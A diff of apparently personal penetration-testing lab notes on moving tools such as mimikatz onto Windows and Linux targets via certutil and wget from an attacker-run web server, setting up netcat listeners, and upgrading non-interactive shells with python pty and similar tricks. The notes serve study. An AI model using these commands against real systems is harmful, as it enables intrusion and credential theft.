@@ -22,20 +22,24 @@ http.server => python3**
 - set up netcat listener 
 - simple command shell session is established (if it did not work run again )
 transfer file to target system in `tmp` directory 
+![[Pasted image 20230924135933.png]]
 - ./mimikatz.exe is to execute the file
 
 Downloading without python http-server
 - in a command shell, download file: `certutil -urlcache -f http://adres_webserver
 - _ip/filename_downloading.exe file_savingname.exe`
 
-10.2.26.89 target 
+10.2.29.11 target  util -urlcache -f http://
 10.10.11.2
+
+Go to binaries 
+![[Pasted image 20230924135232.png]] 
 
 ##### Transfer to linux targets 
 
 
 
-- tmux (multiple terminal sessions in 1)
+- **tmux** (multiple terminal sessions in 1)
 	- new: control + B + C 
 	- *  is waar je nu active in bent 
 	- new: control + B + 0 
@@ -59,7 +63,6 @@ Downloading without python http-server
 - `cat /etc/*release`
 
 transfer file to victim 
-- `control+b c `
 - set up python file server in the right path: `python3 -m http.server 80` 
 - Download file `wget http://adres_webserver/filename.exe ` 
 
@@ -75,12 +78,17 @@ Non interactive shell is a shell without a prompt ![[Pasted image 20230920164420
 
 **How to get interactive shell**
 
+Whenever you gain access to the target system with a non-interactive command shell, it is always recommended to upgrade the shell to avoid any issues with input and output.
+
+The first technique involves spawning a **bash** session, this can be done by running the following command:
+
+
 Method 1
-- list shells installed don system: `etc /etc/sells 
+- list shells installed don system: `cat /etc/sells 
 	- use any of the shells and add `-i `
-	  
+	
 Method 2 getting interactive shell with programming languages 
-- version of python is installed: `python version`
+- version of python is installed: `python --version`
 	- `python -c 'import pty; pty.spawn("/bin/bash")' `
 - perl
 	- `perl help `
@@ -88,11 +96,18 @@ Method 2 getting interactive shell with programming languages
 - ruby
 	- `ruby: exec "bin/bash"`
 
+**`python -c 'import pty; pty.spawn("/bin/bash")' `**
+	1. `python -c`: This part of the command invokes the Python interpreter with the `-c` option, which allows you to run a Python one-liner directly from the command line.
+	2. `'import pty;pty.spawn("/bin/bash")'`: This is the Python one-liner that's executed. Let's break it down further:
+	    - `import pty`: This imports the `pty` module in Python. The `pty` module provides functions for working with pseudo-terminals.
+	    - `pty.spawn("/bin/bash")`: This line uses the `spawn` function from the `pty` module to start an interactive `/bin/bash` shell. It essentially creates a new pseudo-terminal and attaches it to the `/bin/bash` process, effectively turning the current non-interactive shell into an interactive Bash shell.
+	    
 
 Method: 3 getting interactive shell 
 Get interactive shell through:
-- Enter the following command to set the PATH environment variable, which tells the system where to find executable files: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr:/bin:sbin:/bin `
+- Enter the following command to set the PATH environment variable, which tells the system where to find executable files: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
 - This will display a list of environment variables, including the one you just set. `env` 
-- This command specifies the terminal type you'll be using in your shell session. `export TERM=xtern`
+- This command specifies the terminal type you'll be using in your shell session. `export TERM=xterm
 - This command sets your default shell to Bash. `export SHELL=bash` 
-- to view the contents of the current directory with additional details (including file sizes and permissions), use the following command:  `ls -alps`
+	- or try `chsh -s /bin/bash `
+- to view the contents of the current directory with additional details (including file sizes and permissions), use the following command:  `ls -alps`  
